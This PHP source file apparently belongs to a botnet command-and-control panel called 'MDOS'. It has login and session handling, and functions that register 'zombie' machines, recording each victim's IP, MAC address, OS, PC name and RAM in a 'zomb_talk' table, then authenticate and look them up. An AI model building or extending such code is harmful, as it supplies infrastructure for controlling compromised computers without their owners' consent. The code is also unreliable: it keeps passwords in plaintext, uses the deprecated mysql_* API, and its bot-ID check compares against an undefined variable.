<?php
	class MDOS {
		function HTMLPrintIndex($error) {
			$fwd = dirname(__FILE__).'/../template/'.SYS_THEME.'/htmlcontent/index.html';
			$content = read_file($fwd);
			$md_d1 = str_replace ("%url%", SYS_URL, $content);
			$md_d2 = str_replace ("%default_theme%", SYS_THEME, $md_d1);
			if ($error != "") {
				$sp_data = '<div id = "error" style ="text-align:center;margin-top:20px;"><img src = "template/'.SYS_THEME.'/'.$error.'erreur.png" alt = "Erreur. Remplissez les champs de nouveau."></div>';
				$md_d2 = str_replace ("%error%", $sp_data, $md_d2);
			}
			else {
				$md_d2 = str_replace ("%error%", "", $md_d2);
			}
			echo $md_d2;
		}
		function HTMLPrintUser($info_sid, $info_log, $tab, $data = "") {
			$content = read_file (dirname(__FILE__).'/../template/'.SYS_THEME.'/htmlcontent/user.html');
			$tabcontent = read_file (dirname(__FILE__).'/../template/'.SYS_THEME.'/htmlcontent/user'.$tab.'.html');
			$md_d1 = str_replace ("%tab%", $tabcontent, $content);
			$md_d2 = str_replace ("%url%", SYS_URL, $md_d1);
			$md_d3 = str_replace ("%default_theme%", SYS_THEME, $md_d2);
			$md_d4 = str_replace ("%info_log%", $info_log, $md_d3);
			$md_d5 = str_replace ("%info_sid%", $info_sid, $md_d4);
			if ($data != "") {
				$md_d5 = str_replace ("%logdata%", $data, $md_d5);
			}
			echo $md_d5;
		}
		function WriteLog ($ip, $type, $data) {
			$d_date = (date("d"))."/".(date("m"))." ".(date("H")).":".(date("i"));
			$s_string = ($d_date.'|'.$type.'|'.$ip.'|'.$data);
			$fpath = (dirname(__FILE__).'/../task/rawlog/rawlog.txt');
			file_put_contents ($fpath, $s_string."\n", FILE_APPEND);
		}
		function DBTryConnect ($login, $passwd) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "SELECT * FROM user_account WHERE login = '".(mysql_real_escape_string($login))."' AND password = '".(mysql_real_escape_string($passwd))."' ";
			$query = mysql_query($sql);
			if ( mysql_num_rows($query) === 1 ) {
				mysql_close($link);
				Return True;
			} else {
				mysql_close($link);
				Return False;
			}
		}
		function DBGetMDP ($logx) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "SELECT password FROM user_account WHERE login =  '".(mysql_real_escape_string($logx))."'";
			$query = mysql_query($sql);
			$result =  mysql_result($query,0);
			mysql_close($link);
			return $result;
		}
		function DBCheckLog ($log) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "SELECT * FROM user_account WHERE login = '".(mysql_real_escape_string($log))."'";
			$query = mysql_query($sql);
			if ( mysql_num_rows($query) === 1 ) {
				mysql_close($link);
				Return True;
			} else {
				mysql_close($link);
				Return False;
			}
		}
		function SecureCheckSID ($sid, $mdp) {
			$MDOS = new MDOS;
			$session = (date("z")).(date("d")).(date("g")).(date("f"));
			$string = ($mdp.($MDOS -> RetrieveIP()).SYS_SALT.$session);
			$subsid = md5($string);
			$sidx = substr ($subsid, 0, 6);
			if ($sid == $sidx) {
				return true ;
			}
			else {
				return false;
			}
		}
		function SecureCalcSID ($info_mdp) {
			$MDOS = new MDOS;
			$session = (date("z")).(date("d")).(date("g")).(date("f"));
			$string = ($info_mdp.($MDOS -> RetrieveIP()).SYS_SALT.$session);
			$subsid = md5($string);
			$sid = substr ($subsid, 0, 6);
			return $sid;
		}
		function SecureCheckZombSID ($sid) {
			$s = SYS_SALT;
			$u = SYS_URL;
			$string = ($s.(strrev($u))) ;
			$sidx = md5($string);
			if ($sidx == $g) {
				return True;
			}
			else {
				return False;
			}
		}
		function SecureRedirect ($direct) {
			if (headers_sent())
			{
				echo
					(isset($_SERVER['HTTP_USER_AGENT']) && (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false))
					? '<script type="text/javascript">window.location.href("'.$direct.'");</script>'
					: '<script type="text/javascript">window.location.replace("'.$direct.'");</script>';
			}
			else
			{
				header ('Location: '.$direct);
				exit;
			}
		}
		function RetrieveIP () {
			$ip = (!empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (!empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : $_SERVER['REMOTE_ADDR']));
			return $ip;
		}
		function ZombRegister ($a, $b, $c, $d, $e, $f, $g, $h, $i, $j) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "INSERT INTO `".MYSQL_DB."`.`zomb_talk` (`ip`, `lang`, `localgateway`, `os`, `macadr`, `archetype`, `pcname`, `ram`, `sid`, `status`) VALUES ('".mysql_real_escape_string($a)."', '".mysql_real_escape_string($b)."', '".mysql_real_escape_string($c)."', '".mysql_real_escape_string($d)."', '".mysql_real_escape_string($e)."', '".mysql_real_escape_string($f)."', '".mysql_real_escape_string($g)."', '".mysql_real_escape_string($h)."', '".mysql_real_escape_string($i)."', '".mysql_real_escape_string($j)."')";
			$query = mysql_query($sql);
			mysql_close($link);
		}
		function ZombExists ($entry) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "SELECT * FROM zomb_talk WHERE macadr = '".(mysql_real_escape_string($entry))."'";
			$query = mysql_query($sql);
			if ( mysql_num_rows($query) === 1 ) {
				mysql_close($link);
				Return True;
			} else {
				mysql_close($link);
				Return False;
			}
		}
	}
	function read_file($sfile) {
		$fwd = $sfile;
		$hwd = fopen ($fwd, 'r');
		$content = fread($hwd, filesize($fwd));
		fclose($hwd);
		return $content;
	}
?>